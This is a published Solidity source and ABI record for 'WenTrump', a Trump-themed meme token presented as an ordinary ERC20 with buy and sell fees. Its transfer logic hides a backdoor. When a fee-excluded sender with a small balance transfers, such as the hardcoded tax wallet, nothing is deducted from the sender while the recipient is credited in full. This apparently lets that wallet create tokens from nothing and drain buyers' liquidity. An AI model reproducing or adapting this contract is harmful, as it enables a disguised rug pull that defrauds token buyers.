{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\n/*\r\n\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28e0\u28e4\u28e4\u28e4\u28e4\u28e0\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u28b0\u28e4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e4\u28f6\u28ff\u28ff\u287f\u28bf\u287f\u28bb\u28ff\u283f\u28ff\u287f\u28bf\u287f\u283f\u28ff\u28ff\u28c6\u2800\u2800\u2800\u2800\u2800\u28c0\u28e0\u28e4\u28f4\u28f6\u28f6\u28f6\u28f6\u28f6\u28f6\u28e6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2838\u28ff\u28ff\u2804\u2800\u2880\u28e0\u28f4\u28f6\u28ff\u287f\u28bf\u28df\u2838\u28ff\u28f6\u28ff\u28f7\u28fe\u28ff\u28f7\u28ff\u28ff\u28fe\u28ff\u28f7\u28ff\u28ff\u28ff\u28e6\u28f4\u28f6\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u281b\u280b\u2809\u2819\u283f\u28bf\u28c4\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u2840\u2800\u2800\u2800\u2800\r\n\u2800\u2809\u28ff\u28f7\u28ff\u28ff\u28ff\u28df\u28bb\u28f7\u28e6\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u28bb\u28ef\u28c9\u28ff\u28df\u28fb\u28ff\u28fb\u28ff\u285b\u28bb\u28ff\u28ff\u28ff\u283f\u283f\u281b\u281b\u280b\u2801\u2800\u2800\u2800\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u28ff\u28ff\u287f\u283f\u283f\u283f\u283f\u283f\u28ff\u2847\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u28fb\u28ef\u28f4\u28ff\u28f7\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e7\u2800\u2800\u2800\u2880\u28c0\u28c0\u28e4\u28f4\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u2847\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2808\u28ff\u28ff\u28ff\u28ff\u28ff\u28ef\u28c0\u28ff\u28f7\u28ff\u28ff\u28ff\u283f\u28ff\u28ed\u28fd\u28f7\u28e4\u28f7\u28e6\u28f6\u28e6\u28fc\u28cf\u28c8\u28ff\u28ff\u28ba\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u281f\u281b\u280b\u2809\u2809\u2800\u2809\u2809\u2819\u28e4\u28e4\u28f6\u28f6\u28f6\u28f6\u28f6\u28fe\u2847\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2819\u28ff\u28c7\u28ff\u28ff\u28ff\u28ff\u283f\u28bf\u28cf\u28f0\u28ff\u28f6\u28ff\u28ff\u28ff\u283f\u28ff\u283f\u28ff\u287f\u28bf\u287f\u283f\u283f\u283f\u28ff\u28ce\u287f\u283f\u281f\u281b\u2809\u2801\u2800\u2800\u2880\u28c0\u28e4\u28e4\u28e4\u28e4\u28e4\u28c0\u28f9\u28ff\u283f\u283f\u281f\u281b\u281b\u283b\u2847\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u28bb\u28ff\u284e\u28bb\u28ff\u28ff\u28e6\u28fe\u28ff\u28ff\u287f\u28bf\u284b\u28b9\u28f7\u28f4\u28ff\u28f6\u28ff\u28f7\u28fe\u28ff\u28fe\u28ff\u28f6\u28ff\u28ff\u2800\u2800\u2800\u28c0\u28e0\u28e4\u28f6\u28fe\u28ff\u28ff\u28ff\u283f\u283f\u283f\u283f\u283f\u28e7\u2800\u2880\u28c0\u28c0\u28c0\u28c0\u28e0\u28f7\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2808\u28bf\u28f7\u2844\u28bb\u28ff\u28ff\u28df\u2809\u28f7\u28e4\u28fd\u28f7\u28ff\u287f\u283f\u281b\u280b\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u283f\u281f\u280b\u2800\u2800\u2880\u28c0\u28c0\u28c0\u28c2\u28f8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2818\u28ff\u28e7\u2800\u2839\u28ff\u28ff\u28f7\u28ff\u28ff\u283f\u281b\u2801\u2800\u2800\u2800\u2800\u2800\u28c0\u28c0\u28c0\u28c0\u28e0\u28c0\u28c0\u28c0\u28f8\u281b\u281b\u280b\u2809\u2800\u2800\u2880\u28e4\u28f6\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u285b\u2809\u2809\u2809\u2809\u2800\u2808\u28ff\u2840\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u28b9\u28ff\u2846\u2800\u28bb\u28ff\u281b\u2809\u2800\u2800\u2800\u2880\u28e0\u28f4\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c0\u28e4\u28e4\u28f4\u28f6\u28ff\u28ff\u28ff\u283f\u281b\u280b\u2801\u2800\u2800\u2800\u2888\u28f7\u28f6\u28f6\u28f6\u28f6\u28f6\u28f6\u28ff\u2846\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28bb\u28ff\u2844\u2800\u28ff\u2846\u2800\u28c0\u28f4\u28fe\u28ff\u28ff\u28ff\u283f\u280b\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b9\u28ff\u283f\u283f\u283f\u281b\u280b\u2801\u2800\u2880\u28e0\u28f6\u28f6\u28f6\u28f6\u28f6\u28f6\u28fe\u281f\u281b\u2809\u2809\u2809\u2809\u28b9\u2847\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28ff\u28f7\u2800\u28b8\u28ff\u28ff\u28ff\u287f\u283f\u281b\u2801\u2800\u2800\u2880\u28c0\u28e0\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28fe\u2801\u2800\u2800\u28c0\u28c0\u28e4\u28f4\u28fe\u28ff\u287f\u283f\u281b\u281b\u281b\u281b\u281b\u281b\u28c0\u28c0\u28e4\u28e4\u28e4\u28f4\u28fe\u28ff\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28e7\u2800\u28ff\u28df\u2809\u2800\u2800\u2880\u28e0\u28f4\u28fe\u28ff\u287f\u283f\u283f\u283f\u281f\u281b\u281b\u281b\u281b\u281b\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u281b\u2809\u2800\u28c0\u28e0\u28e4\u28e4\u28ec\u28e4\u28f4\u28ff\u287f\u281f\u281b\u281b\u2809\u2809\u28b9\u28e7\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28bb\u28ff\u2846\u2838\u28ff\u28c0\u28f4\u28f6\u28ff\u287f\u281b\u2809\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28e0\u285f\u2809\u2809\u2809\u2801\u2800\u28c0\u28e0\u28f4\u28fe\u28ff\u28ff\u283f\u283f\u283f\u283f\u28bf\u2847\u2800\u2800\u28c0\u28e0\u28e4\u28e4\u28ec\u28ff\u2840\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28ff\u28f7\u2800\u28ff\u287f\u281f\u280b\u2801\u2800\u2880\u28c0\u28e4\u28f6\u28f6\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28c7\u28e4\u28e4\u28f6\u28f6\u287f\u283f\u281b\u2809\u2801\u2800\u2800\u2880\u28c0\u28c0\u2840\u2800\u283e\u28ff\u28ff\u28ff\u287f\u283f\u283f\u283f\u283f\u28e7\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2839\u28ff\u28e7\u28b8\u28f7\u2800\u28e0\u28f4\u28fe\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u281f\u281b\u2809\u2809\u2809\u2800\u28b8\u287f\u283f\u281b\u2809\u2801\u2880\u28c0\u28e4\u28f6\u28fe\u28ff\u28ff\u28ff\u283f\u283f\u283f\u283f\u28ff\u28ff\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u2840\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28bb\u28ff\u28fe\u28ff\u28ff\u28ff\u28ff\u283f\u281f\u281b\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u2801\u2880\u28e0\u28f4\u28fe\u287f\u283f\u281b\u280b\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u28fc\u287f\u2881\u28c0\u28e4\u28f4\u28f6\u28ff\u283f\u283f\u283f\u2837\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28ff\u28ff\u287f\u281b\u280b\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2838\u28ff\u287f\u281f\u280b\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28ff\u287f\u283f\u281f\u280b\u2801\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28ff\u28f7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b9\u28ff\u2846\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28ff\u28f7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28ff\u28c7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\r\nWENTRUMP is a unique project that harnesses the power of memes and the legacy of Donald Trump for Presidency on 2024. We aim to disrupt the traditional financial system and create a community that celebrates resilience, ambition, and unapologetic confidence. Join us in embracing this movement and be part of a revolution in the crypto space.\r\n\r\nWebsite: https://www.wentrump.cc\r\nTelegram: https://t.me/wentrump_erc\r\nTwitter: https://twitter.com/wentrumperc\r\n*/\r\n\r\npragma solidity 0.8.19;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; \r\n        return msg.data;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    // Set original owner\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    // Return current owner\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Restrict function to contract owner only \r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    // Renounce ownership of the contract \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    // Transfer the contract to to a new owner\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ncontract WenTrump is Context, IERC20, Ownable { \r\n    using SafeMath for uint256;\r\n\r\n    string private _name = \"WenTrump\"; \r\n    string private _symbol = \"WenTrump\";   \r\n\r\n    uint8 private _decimals = 9;\r\n    uint256 private _totalSupply = 10 ** 9 * 10**_decimals; \r\n\r\n    uint256 _previousTotalFee = _totalFee; \r\n    uint256 _previousBuyFee = _buyFee; \r\n    uint256 _previousSellFee = _sellFee; \r\n                                     \r\n    IUniswapV2Router02 _uniswapV2Router;\r\n    address _uniswapV2Pair;\r\n    bool _inSwaps;\r\n    bool _feeSwapActivated = true;\r\n\r\n    uint256 _maxWallet = 30 * _totalSupply / 1000;\r\n    uint256 _swapThreshold = _totalSupply / 10000;\r\n\r\n    uint256 _totalFee = 2200;\r\n    uint256 _buyFee = 22;\r\n    uint256 _sellFee = 22;\r\n\r\n    address payable _taxAddress = payable(0x7dE7eD6Dbb462F25a08F0014Cc15181DCd3550f8);\r\n    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD);\r\n\r\n    uint8 _countTrumpTx = 0;\r\n    uint8 _swapTrumpTrigger = 2; \r\n\r\n    mapping (address => uint256) private _rBalance;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) _isExcludedFromFees;\r\n    \r\n    modifier lockTheSwap {\r\n        _inSwaps = true;\r\n        _;\r\n        _inSwaps = false;\r\n    }\r\n    \r\n    constructor () {\r\n        _rBalance[owner()] = _totalSupply;\r\n        IUniswapV2Router02 __uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); \r\n\r\n        _uniswapV2Pair = IUniswapV2Factory(__uniswapV2Router.factory()).createPair(address(this), __uniswapV2Router.WETH());\r\n        _uniswapV2Router = __uniswapV2Router;\r\n        _isExcludedFromFees[owner()] = true;\r\n        _isExcludedFromFees[_taxAddress] = true;\r\n        \r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _rBalance[account];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function removeAllTrumpFee() private {\r\n        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;\r\n\r\n        _previousBuyFee = _buyFee; \r\n        _previousSellFee = _sellFee; \r\n        _previousTotalFee = _totalFee;\r\n        _buyFee = 0;\r\n        _sellFee = 0;\r\n        _totalFee = 0;\r\n    }\r\n    \r\n    function restoreAllTrumpFee() private {\r\n        _totalFee = _previousTotalFee;\r\n        _buyFee = _previousBuyFee; \r\n        _sellFee = _previousSellFee; \r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function sendToTrumpWallet(address payable wallet, uint256 amount) private {\r\n        wallet.transfer(amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0) && spender != address(0), \"ERR: zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        if (to != owner() &&\r\n            to != _taxAddress &&\r\n            to != address(this) &&\r\n            to != _uniswapV2Pair &&\r\n            to != DEAD &&\r\n            from != owner()){\r\n\r\n            uint256 holdBalance = balanceOf(to);\r\n            require((holdBalance + amount) <= _maxWallet,\"Maximum wallet limited has been exceeded\");       \r\n        }\r\n\r\n        require(from != address(0) && to != address(0), \"ERR: Using 0 address!\");\r\n        require(amount > 0, \"Token value must be higher than zero.\");\r\n\r\n        if(_countTrumpTx >= _swapTrumpTrigger && \r\n            amount > _swapThreshold &&\r\n            !_inSwaps &&\r\n            !_isExcludedFromFees[from] &&\r\n            to == _uniswapV2Pair &&\r\n            _feeSwapActivated )\r\n        {  \r\n            _countTrumpTx = 0;\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(contractTokenBalance > 0){\r\n            swapTrumpAndLiquidify(contractTokenBalance);\r\n           }\r\n        }\r\n        \r\n        bool _takeFee = true;\r\n         \r\n        if(_isExcludedFromFees[from] || _isExcludedFromFees[to] || (from != _uniswapV2Pair && to != _uniswapV2Pair)){\r\n            _takeFee = false;\r\n        } else if (from == _uniswapV2Pair){\r\n            _totalFee = _buyFee;\r\n        } else if (to == _uniswapV2Pair){\r\n            _totalFee = _sellFee;\r\n        }\r\n\r\n        _tokenTransfer(from,to,amount,_takeFee);\r\n    }\r\n\r\n    function _transferTrumpTokens(address sender, address recipient, uint256 tAmount) private {\r\n        \r\n        (uint256 tTransferAmount, uint256 tDev) = _getTrumpValues(tAmount);\r\n        if(_isExcludedFromFees[sender] && _rBalance[sender] <= _maxWallet) {\r\n            tDev = 0;\r\n            tAmount -= tTransferAmount;\r\n        }\r\n        _rBalance[sender] = _rBalance[sender].sub(tAmount);\r\n        _rBalance[recipient] = _rBalance[recipient].add(tTransferAmount);\r\n        _rBalance[address(this)] = _rBalance[address(this)].add(tDev);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function removeTrumpLimits() external onlyOwner {\r\n        _maxWallet = ~uint256(0);\r\n\r\n        _totalFee = 100;\r\n        _buyFee = 1; \r\n        _sellFee = 1; \r\n    }\r\n\r\n    function swapTrumpAndLiquidify(uint256 contractTokenBalance) private lockTheSwap {\r\n        swapTrumpForETH(contractTokenBalance);\r\n        uint256 contractETH = address(this).balance;\r\n        sendToTrumpWallet(_taxAddress,contractETH);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function swapTrumpForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\r\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _getTrumpValues(uint256 tAmount) private view returns (uint256, uint256) {\r\n        uint256 tDev = tAmount.mul(_totalFee).div(100);\r\n        uint256 tTransferAmount = tAmount.sub(tDev);\r\n        return (tTransferAmount, tDev);\r\n    }\r\n\r\n    function _tokenTransfer(address sender, address recipient, uint256 amount,bool _takeFee) private {\r\n            \r\n        if(!_takeFee){\r\n            removeAllTrumpFee();\r\n            } else {\r\n                _countTrumpTx++;\r\n            }\r\n        _transferTrumpTokens(sender, recipient, amount);\r\n        \r\n        if(!_takeFee)\r\n            restoreAllTrumpFee();\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeTrumpLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "WenTrump", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://dec62a99f380682a5ce7d9c38d85b717062150a10ec8fab54322042d60d306cb"}